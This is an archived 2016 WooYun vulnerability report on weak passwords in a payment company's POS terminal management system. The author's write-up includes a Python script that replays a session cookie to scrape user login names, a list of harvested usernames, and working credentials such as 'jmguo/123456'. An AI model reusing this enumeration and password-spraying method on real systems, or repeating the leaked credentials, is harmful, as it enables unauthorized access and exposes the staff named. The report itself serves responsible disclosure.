{"id": 87521, "wybug_id": "wooyun-2016-0198017", "wybug_title": "某大型第三方支付机构商务终端TPM系统用户体制不严涉及大量敏感信息                                      ", "wybug_corp": "某大型第三方支付机构", "wybug_author": "jianFen", "wybug_date": "2016-04-19 11:40", "wybug_open_date": "2016-06-06 16:50", "wybug_type": "后台弱口令", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "后台管理地址对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-06：\t细节向公众公开  简要描述： 1 .通过手动远程下载来实现POS程序升级和通过自动远程下载来实现POS程序升级，以及新装机业务的程序、参数下载2 .POS机由分公司灌装主密钥后分发到各地市，若有新装机，则由地市维护人员远程下装应用程序和参数来实现快速装机 详细说明：  中国银联终端远程维护管理系统(TMS)http://\n\nmask 区域\n1.://**.**.**/tpm/ms/login.do\n\n人名字典爆破lijing/123456 权限不高但是也有不少数据 通过在线用户获取用户名\n\n手爬太枯燥了我这里直接代码上的是之后发送邮件处能查找的所以用户的列表和\"在线用户方法一样\"\n#coding=utf-8import requestsimport refrom lxml import etreeimport timeimport syssys.getdefaultencoding()reload(sys)sys.setdefaultencoding('UTF-8')sys.getdefaultencoding()def postcode(pageId):\turl = \"http://***********/tpm/ms/user/userListLookupMul.do\"\t\thead = {\t'Host': '***********',\t'Proxy-Connection': 'keep-alive',\t'Content-Length': '45',\t'Accept': '*/*',\t'Origin': 'http://***********',\t'X-Requested-With': 'XMLHttpRequest',\t'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0',\t'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\t'Referer': 'http://***********/tpm/ms/index.do',\t'Accept-Encoding': 'gzip,deflate',\t'Accept-Language': 'zh-CN,zh;q=0.8',\t'Cookie': 'JSESSIONID=************************'\t}\tdata= \"pageNum=\"+pageId+\"&loginName=&name=&**.**.**.**rg=&hisIusr=&numPerPage=20\"\tproxy={'http':'**.**.**.**:8080'}\tkey = requests.post(url,headers=head,data=data,proxies=proxy)\t#print key.headers\tcalc = key.text\t#print calc\t\tselector = etree.HTML(calc)\tcontent = selector.xpath('//tr/td[@onclick=\"chooseTd(this)\"][position()=1]/text()')\tfp1 = open(\"C:\\Users\\Administrator\\Desktop\\\\loginname1.txt\",'a')\tfor i in content:\t\tfp1.write(''.join(i.split())+'\\n')\t#获取验证码fp = open(\"C:\\Users\\Administrator\\Desktop\\\\id.txt\")#postcode('1')print u'处理开始'for i in fp:\tpostcode(i[:-1])\tprint 'page spider full%s'%i\n\ntgheynliypwuxzhguozhongduan2ybjiangtgheypwuxjzhurbhongynliyhzhanghlliu3taoluoxiaxiaolijinggeyongxucao1zztangdlyangcaixqkyyangjingwang2mjjiangjilin1yqjiangVFI-QiuGXjlchen2ywang1wangdwhzdengjmguo\n密码均为123456jmguo/123456登录几个高权限\n\nTMS系统\n\n开发项目信息\n\n秘钥\n\n   漏洞证明：  20万+ 秘钥查看元素即可\n\n   修复方案：  1.验证码验证一次2.用户体制不严3.系统对外   版权声明：转载请注明来源 jianFen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-04-22 16:40 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT直接通报给中国银联,由其后续协调网站管理部门处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-19 11:41 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 多学习，多挖洞！)\t\t \n  前排坐等公开    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}